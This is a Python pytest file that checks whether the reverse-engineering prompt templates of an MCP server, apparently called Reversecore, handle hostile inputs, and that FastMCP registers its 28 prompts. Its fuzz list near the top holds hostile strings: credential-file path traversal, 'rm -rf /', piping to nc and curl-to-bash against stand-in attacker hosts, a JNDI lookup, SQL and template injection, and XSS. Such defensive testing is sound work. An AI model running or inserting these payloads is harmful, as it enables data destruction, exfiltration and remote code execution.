"""Empirical adversarial tests for Reversecore MCP Prompts and FastMCP introspection."""

import time
from typing import Any

import pytest
from fastmcp import FastMCP
from fastmcp.exceptions import PromptError

from reversecore_mcp.prompts import (
    exploit_analysis_mode,
    malware_deobfuscation_mode,
    register_prompts,
    vulnerability_triage_mode,
)
from reversecore_mcp.prompts.common import DOCKER_PATH_RULE, LANGUAGE_RULE

# Standard adversarial input vectors
ADVERSARIAL_STRINGS = [
    # Path traversal & filesystem attacks
    "../../../../../../etc/passwd",
    "/app/workspace/../../root/.ssh/id_rsa",
    "..\\..\\..\\Windows\\System32\\cmd.exe",
    # Shell & Command injection payloads
    "$(whoami)",
    "`id`",
    "target.elf; rm -rf /",
    "target.elf | nc evil.com 1337",
    "test && curl http://attacker.com/payload.sh | bash",
    # SQL / Code injection payloads
    "' OR '1'='1' --",
    "admin'--",
    "'; DROP TABLE users; --",
    # Format strings & template syntax
    "%s%s%s%s%s%s%s%s%s%s",
    "%x%x%x%x%x%x%x%x",
    "%n%n%n%n",
    "%p%p%p%p",
    "{{7*7}}",
    "{{config.__class__.__init__.__globals__}}",
    "{OFFSET}",
    "{filename}",
    "${jndi:ldap://evil.com/a}",
    # Markdown & HTML breakouts
    "```python\nimport os\nos.system('id')\n```",
    "```\n```\n```\n```",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<![CDATA[<test></test>]]>",
    # Unicode & Multilingual & Emojis
    "🦀 👾 💀 🚀 💉 🔍 🔎 ❓",
    "한국어_취약점_분석_타겟.elf",
    "Тест_эксплойта_123.bin",
    "中文_漏洞_分析.exe",
    "مرحبا_بالعالم.bin",
    # Special whitespace and control characters
    "binary with spaces and (brackets) [and] {curlys}.bin",
    "sample\r\n\ttest.bin",
    "sample\x00nullbyte.bin",
    "sample\x1b[31;1mANSI\x1b[0m.bin",
    # Quotes & Delimiters
    '""" triple quotes """',
    "''' single triple quotes '''",
    '"escaped_quotes"',
    "\\'escaped_single\\'",
]


class TestVulnerabilityTriageAdversarial:
    """Adversarial testing for vulnerability_triage_mode."""

    def test_null_and_empty_inputs(self):
        # Empty string
        res_empty = vulnerability_triage_mode("")
        assert "[Crash Log Context]" not in res_empty
        assert "Vulnerability Triage Report" in res_empty

        # None input
        res_none = vulnerability_triage_mode(None)
        assert "[Crash Log Context]" not in res_none
        assert "Vulnerability Triage Report" in res_none

        # Whitespace-only input
        res_space = vulnerability_triage_mode("   \n\t  ")
        assert "[Crash Log Context]" in res_space
        assert "   \n\t  " in res_space

    def test_massive_50kb_and_200kb_logs(self):
        # 50KB+ crash log (1500 lines ~ 70KB)
        log_50kb = (
            "==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000018\n"
            + ("    #0 0x401234 in parse_input /app/vuln.c:42\n" * 1500)
        )
        assert len(log_50kb) >= 50000

        t0 = time.perf_counter()
        res_50kb = vulnerability_triage_mode(log_50kb)
        t_elapsed = time.perf_counter() - t0

        assert len(res_50kb) > 50000
        assert log_50kb in res_50kb
        assert t_elapsed < 0.05, f"Rendering 50KB log took too long: {t_elapsed:.4f}s"

        # 200KB crash log
        log_200kb = "A" * 200000
        res_200kb = vulnerability_triage_mode(log_200kb)
        assert len(res_200kb) >= 200000
        assert log_200kb in res_200kb

    @pytest.mark.parametrize("adversarial_input", ADVERSARIAL_STRINGS)
    def test_adversarial_crash_logs(self, adversarial_input):
        result = vulnerability_triage_mode(adversarial_input)
        assert adversarial_input in result
        assert "[Crash Log Context]" in result
        assert LANGUAGE_RULE in result
        assert DOCKER_PATH_RULE in result
        assert "[🔍 OBSERVED]" in result
        assert "[🔎 INFERRED]" in result
        assert "[❓ POSSIBLE]" in result


class TestExploitAnalysisAdversarial:
    """Adversarial testing for exploit_analysis_mode."""

    def test_boundary_filenames(self):
        # Default
        res_default = exploit_analysis_mode()
        assert "target_binary" in res_default

        # Empty string
        res_empty = exploit_analysis_mode("")
        assert "Analyze the binary ''" in res_empty
        assert 'parse_binary_with_lief("")' in res_empty

        # None input
        res_none = exploit_analysis_mode(None)
        assert "Analyze the binary 'None'" in res_none

    @pytest.mark.parametrize("adversarial_input", ADVERSARIAL_STRINGS)
    def test_adversarial_binary_filenames(self, adversarial_input):
        result = exploit_analysis_mode(adversarial_input)
        assert adversarial_input in result
        assert LANGUAGE_RULE in result
        assert DOCKER_PATH_RULE in result
        assert "[🔍 OBSERVED]" in result
        assert "[🔎 INFERRED]" in result
        assert "[❓ POSSIBLE]" in result
        assert "pwntools" in result or "from pwn import *" in result


class TestMalwareDeobfuscationAdversarial:
    """Adversarial testing for malware_deobfuscation_mode."""

    def test_boundary_filenames(self):
        # Default
        res_default = malware_deobfuscation_mode()
        assert "target_binary" in res_default

        # Empty string
        res_empty = malware_deobfuscation_mode("")
        assert "Analyze the obfuscated binary ''" in res_empty

        # None input
        res_none = malware_deobfuscation_mode(None)
        assert "Analyze the obfuscated binary 'None'" in res_none

    @pytest.mark.parametrize("adversarial_input", ADVERSARIAL_STRINGS)
    def test_adversarial_binary_filenames(self, adversarial_input):
        result = malware_deobfuscation_mode(adversarial_input)
        assert adversarial_input in result
        assert LANGUAGE_RULE in result
        assert DOCKER_PATH_RULE in result
        assert "[🔍 OBSERVED]" in result
        assert "[🔎 INFERRED]" in result
        assert "[❓ POSSIBLE]" in result
        assert "deobfuscate_strings" in result
        assert "resolve_api_hashes" in result


async def _get_prompts_map(server) -> dict[str, Any]:
    if hasattr(server, "list_prompts"):
        prompts = await server.list_prompts()
        return {p.name: p for p in prompts}
    return server._prompt_manager._prompts


async def _render_prompt_compat(server, name: str, args: dict[str, Any]) -> Any:
    if hasattr(server, "render_prompt"):
        return await server.render_prompt(name, args)
    return await server._prompt_manager.render_prompt(name, args)


class TestFastMCPPromptRegistrationAndIntrospection:
    """Adversarial and introspective tests for FastMCP prompt subsystem."""

    @pytest.fixture
    def server(self):
        mcp = FastMCP("adversarial_test_server")
        register_prompts(mcp)
        return mcp

    @pytest.mark.asyncio
    async def test_total_prompt_count_and_completeness(self, server):
        # Verify 28 prompts registered
        prompts = await _get_prompts_map(server)
        assert len(prompts) == 28

        expected_all = [
            "full_analysis_mode",
            "malware_analysis_mode",
            "basic_analysis_mode",
            "apt_hunting_mode",
            "malware_defense_mode",
            "unpacking_mode",
            "c2_extraction_mode",
            "ransomware_triage_mode",
            "code_similarity_mode",
            "malware_deobfuscation_mode",
            "patch_analysis_mode",
            "crypto_analysis_mode",
            "firmware_analysis_mode",
            "vulnerability_research_mode",
            "vulnerability_hunter_mode",
            "autonomous_vuln_hunt_mode",
            "source_code_audit_mode",
            "vulnerability_triage_mode",
            "taint_analysis_mode",
            "heap_exploit_mode",
            "fuzzing_mode",
            "patch_diff_auto_mode",
            "cve_discovery_pipeline_mode",
            "exploit_analysis_mode",
            "game_analysis_mode",
            "report_generation_mode",
            "server_health_check_mode",
            "server_tool_catalog_mode",
        ]
        for name in expected_all:
            assert name in prompts, f"Missing registered prompt: {name}"

    @pytest.mark.asyncio
    async def test_prompt_metadata_introspection(self, server):
        """Introspect metadata: name, description, arguments schema across all prompts."""
        prompts = await _get_prompts_map(server)
        for name, prompt_obj in prompts.items():
            assert prompt_obj.name == name
            assert prompt_obj.description is not None
            assert len(prompt_obj.description.strip()) > 0
            assert callable(getattr(prompt_obj, "fn", None))
            assert getattr(prompt_obj, "enabled", True) is True

            # Verify arguments schema
            for arg in prompt_obj.arguments or []:
                assert hasattr(arg, "name")
                assert len(arg.name) > 0
                assert arg.required is False  # All RE prompt arguments should have safe defaults

    @pytest.mark.asyncio
    async def test_fastmcp_render_all_prompts_with_defaults(self, server):
        """Verify rendering every prompt with empty arguments dict."""
        prompts = await _get_prompts_map(server)
        for name in prompts:
            rendered = await _render_prompt_compat(server, name, {})
            assert rendered is not None
            assert len(rendered.messages) >= 1
            content_text = rendered.messages[0].content.text
            assert isinstance(content_text, str)
            assert len(content_text) > 100
            assert LANGUAGE_RULE in content_text

    @pytest.mark.asyncio
    async def test_fastmcp_render_all_prompts_with_adversarial_args(self, server):
        """Verify rendering every prompt with adversarial argument payloads."""
        evil_arg = "🎯_`$(id)`_../../passwd_{{config}}_\x00_🚀"
        prompts = await _get_prompts_map(server)

        for name, p_obj in prompts.items():
            args = {}
            for arg in p_obj.arguments or []:
                args[arg.name] = evil_arg

            rendered = await _render_prompt_compat(server, name, args)
            content_text = rendered.messages[0].content.text
            if args:
                assert evil_arg in content_text

    @pytest.mark.asyncio
    async def test_mcp_protocol_level_list_and_get(self, server):
        """Verify protocol-level _list_prompts_mcp and _get_prompt_mcp JSON-RPC handlers."""
        try:
            import mcp.types

            prompts_res = await server._list_prompts_mcp(mcp.types.ListPromptsRequest())
            prompts_list = prompts_res.prompts
        except (TypeError, AttributeError):
            prompts_list = await server._list_prompts_mcp()

        assert len(prompts_list) == 28

        for prompt_meta in prompts_list:
            assert hasattr(prompt_meta, "name")
            assert hasattr(prompt_meta, "description")

            # Call protocol get handler
            mcp_res = await server._get_prompt_mcp(prompt_meta.name, {})
            assert mcp_res is not None
            assert len(mcp_res.messages) >= 1
            content = mcp_res.messages[0].content
            content_text = content.text if hasattr(content, "text") else str(content)
            assert len(content_text) > 50

    @pytest.mark.asyncio
    async def test_fastmcp_extra_unexpected_arguments(self, server):
        """Verify prompt rendering type-safety when unexpected extra arguments are passed."""
        with pytest.raises((PromptError, Exception)):
            await _render_prompt_compat(
                server,
                "vulnerability_triage_mode",
                {"crash_log": "sample_crash", "unexpected_extra_key": "injected_val"},
            )

    @pytest.mark.asyncio
    async def test_fastmcp_type_coercion_non_string_arguments(self, server):
        """Verify non-string values passed as arguments (int, bool, float)."""
        # Testing integer coercion/stringification
        rendered_int = await _render_prompt_compat(
            server, "exploit_analysis_mode", {"filename": 12345}
        )
        assert "12345" in rendered_int.messages[0].content.text

        rendered_bool = await _render_prompt_compat(
            server, "malware_deobfuscation_mode", {"filename": True}
        )
        assert "True" in rendered_bool.messages[0].content.text
